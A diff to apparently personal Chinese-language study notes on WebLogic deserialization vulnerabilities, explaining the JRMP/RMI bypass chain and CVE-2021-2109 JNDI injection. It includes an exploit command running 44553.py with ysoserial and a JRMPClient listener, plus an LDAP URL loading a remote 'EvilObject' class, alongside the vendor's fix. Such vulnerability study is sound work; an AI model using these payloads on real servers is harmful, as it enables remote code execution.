@@ -548,3 +548,18 @@ python2 44553.py 10.0.22.65 7001 ./ysoserial.jar 10.0.22.65 4444 JRMPClient
     jrmp_client = sys.argv[6]#JRMPClient
 ```
 
+利用java.rmi.registry.Registry，序列化RemoteObjectInvocationHandler，并使用UnicastRef和远端建立tcp连接，获取RMI registry，序列化之后发送给weblogic，weblogic会请求我们的JRMPListener，然后将获取的内容利用readObject()进行解析，导致恶意代码执行。
+
+禁用了java.rmi.registry.Registry之后
+
+![image-20240710102649791](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240710102649791.png)
+
+直接反序列化UnicastRef对象
+使用java.rmi.registry.Registry之外的类。廖新喜用的`java.rmi.activation.Activator`
+
+## Weblogic CVE-2021-2109
+
+我们可以通过LDAP协议方式实现JNDI注入攻击，加载远程CodeBase下的恶意类 ldap://127.0.0;1:1389/EvilObject，由于代码中会自动补全一个.因此可以将context定位为ldap://127.0.0将bindName定位为1:1389/EvilObject，最后的serverName必须为AdminServer，因此构造完整的PoC后，漏洞利用效果如图：：
+
+修复方案，加了一个isValidJndiSchema函数
+![image-20240710104753253](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240710104753253.png)
